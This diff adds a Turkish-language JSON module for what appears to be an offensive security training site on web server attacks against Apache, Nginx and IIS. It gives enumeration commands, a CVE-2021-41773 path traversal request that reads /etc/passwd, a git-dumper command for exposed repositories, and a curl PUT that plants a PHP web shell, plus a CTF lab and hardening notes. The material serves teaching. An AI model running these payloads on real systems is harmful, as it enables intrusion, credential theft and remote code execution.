@@ -1,0 +1,116 @@
+{
+  "id": "web-servers",
+  "slug": "web-servers",
+  "title": "Web Sunucusu Saldırıları",
+  "subtitle": "Apache, Nginx & IIS",
+  "description": "Web sunucularının (Apache, Nginx, IIS) saldırı yüzeyi: sürüm zafiyetleri, yanlış yapılandırma, path traversal, virtual host keşfi ve sertleştirme. Temelden detaya.",
+  "team": "red-team",
+  "category": "Sunucu Saldırıları",
+  "phase": "Exploitation",
+  "icon": "🌐",
+  "color": "#ef4444",
+  "tags": ["apache", "nginx", "iis", "web server", "path traversal", "misconfiguration", "sunucu"],
+  "modules": [
+    {
+      "id": "intro-enum",
+      "title": "Web Sunucusu Keşfi & Yapılandırma",
+      "description": "Sunucu türü tespiti, sürüm ve yapılandırma analizi",
+      "difficulty": "beginner",
+      "duration": "25 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Web Sunucularını Anlamak",
+          "content": "**Web sunucusu**, HTTP isteklerini karşılayıp içerik döndüren yazılımdır. En yaygın üçü:\n\n| Sunucu | Tipik platform | Not |\n|--------|----------------|-----|\n| **Apache** | Linux | .htaccess, modüler |\n| **Nginx** | Linux | Hızlı, reverse proxy |\n| **IIS** | Windows | .aspx, Windows entegre |\n\n**Saldırı yüzeyi:**\n- **Sürüm zafiyetleri:** Eski sürüm → bilinen CVE (örn. Apache 2.4.49 path traversal)\n- **Yanlış yapılandırma:** Directory listing açık, yedek dosyalar, debug modu\n- **Virtual host / subdomain:** Gizli siteler\n- **Hassas dosyalar:** .git, .env, config yedekleri\n- **HTTP metotları:** PUT açıksa dosya yükleme\n\n**Uygulama vs sunucu:** Web uygulaması zafiyetleri (SQLi, XSS) [OWASP] ve [Web Sömürü] modüllerinde; bu modül **sunucu katmanına** (yazılım/yapılandırma) odaklanır.\n\n> Keşif araçları: [Nikto], [Gobuster], [ffuf], [WPScan]."
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Web Sunucu Keşfi",
+          "commands": [
+            {
+              "command": "curl -I http://10.10.10.1",
+              "description": "Sunucu türü ve sürümünü header'dan öğren",
+              "output": "Server: Apache/2.4.49 (Unix)\nX-Powered-By: PHP/7.4",
+              "tip": "Server header'ı türü/sürümü sızdırır → searchsploit ile CVE ara. X-Powered-By backend dilini gösterir."
+            },
+            {
+              "command": "nikto -h http://10.10.10.1",
+              "description": "Sunucu zafiyet ve yanlış yapılandırma taraması",
+              "tip": "Eski sürüm, tehlikeli dosya ve dizinleri hızla bulur. Detay için [Nikto] modülü."
+            },
+            {
+              "command": "gobuster vhost -u http://10.10.10.1 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
+              "description": "Virtual host (gizli subdomain) keşfi",
+              "tip": "Tek IP'de farklı vhost'lar barınabilir. Bulunan vhost'u /etc/hosts'a ekleyip eriş."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "exploitation",
+      "title": "Sürüm Zafiyeti & Yanlış Yapılandırma + Lab",
+      "description": "Path traversal, CVE sömürüsü ve yapılandırma istismarı",
+      "difficulty": "intermediate",
+      "duration": "30 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Sunucu Katmanı Saldırıları",
+          "content": "**Sürüm tabanlı saldırılar:** Sunucu yazılımının bilinen CVE'leri.\n- **Apache 2.4.49/2.4.50 (CVE-2021-41773/42013):** Path traversal → dosya okuma → RCE\n- **IIS WebDAV / short name (8.3):** Dosya/dizin ifşası\n- **Nginx alias misconfiguration:** Path traversal\n\n**Yapılandırma tabanlı saldırılar:**\n| Hata | Sonuç |\n|------|-------|\n| Directory listing açık | Dosya yapısı ifşası |\n| .git/.env erişilebilir | Kaynak kodu/secret |\n| Yedek dosyalar (.bak, ~) | Kaynak kodu |\n| PUT metodu açık | Web shell yükleme |\n| Zayıf .htaccess | Koruma atlatma |\n\n**IIS özel:** .aspx web shell, WebDAV PUT, application pool kimliği privesc.\n\n> Sunucu zafiyeti foothold sağlar; sonrası [Linux Server]/[Windows Server] privesc zinciri."
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Sömürü Komutları",
+          "commands": [
+            {
+              "command": "curl --path-as-is 'http://10.10.10.1/cgi-bin/.%2e/.%2e/.%2e/etc/passwd'",
+              "description": "Apache 2.4.49 path traversal (CVE-2021-41773) ile dosya oku",
+              "tip": "--path-as-is encoding'i bozmaz. mod_cgi açıksa RCE'ye çevrilebilir.",
+              "warning": "Yalnızca yetkili/lab ortamında."
+            },
+            {
+              "command": "git-dumper http://10.10.10.1/.git ./kaynak",
+              "description": "Açık .git dizininden kaynak kodu çek",
+              "tip": "Kaynak kodda kimlik bilgisi, API key ve mantık zafiyetleri bulunur. curl .../.git/config ile önce doğrula."
+            },
+            {
+              "command": "curl -X PUT http://10.10.10.1/shell.txt -d '<?php system($_GET[\"c\"]); ?>'",
+              "description": "PUT metodu açıksa web shell yükle",
+              "tip": "Önce OPTIONS ile PUT'a izin var mı kontrol et. IIS'te WebDAV PUT benzer şekilde kullanılır."
+            }
+          ]
+        },
+        {
+          "id": "lab",
+          "type": "lab",
+          "title": "CTF Senaryosu: Web Sunucusundan Shell'e",
+          "scenario": {
+            "title": "Sürüm Tespiti → Zafiyet → RCE",
+            "objective": "Bir web sunucusunun türü/sürümünü tespit et, bir CVE veya yanlış yapılandırma ile kod çalıştırma elde et ve sisteme eriş.",
+            "environment": "TryHackMe/HTB web makinesi",
+            "difficulty": "intermediate",
+            "steps": [
+              "curl -I ve nikto ile sunucu türü/sürümünü belirle",
+              "searchsploit ile sürüme uygun exploit ara",
+              "gobuster ile dizin/dosya ve vhost keşfi yap",
+              "Path traversal / açık .git / PUT gibi vektör bul",
+              "RCE elde et, reverse shell al ([reverse-shells])",
+              "Privesc ile root/SYSTEM'e geç"
+            ],
+            "hints": [
+              "Server header'ı bazen değiştirilir — davranışsal tespit de yap",
+              "Açık .git neredeyse her zaman kaynak + secret verir",
+              "IIS'te .aspx, Apache/Nginx'te .php web shell kullan"
+            ],
+            "defenseNote": "Savunma: Sunucu sürümünü gizle (ServerTokens Prod / server_tokens off), güncel tut, directory listing'i kapat, .git/.env'i web kökünden çıkar, gereksiz HTTP metotlarını (PUT/DELETE) kapat, WAF kullan ve dosya izinlerini sıkılaştır."
+          }
+        }
+      ]
+    }
+  ]
+}
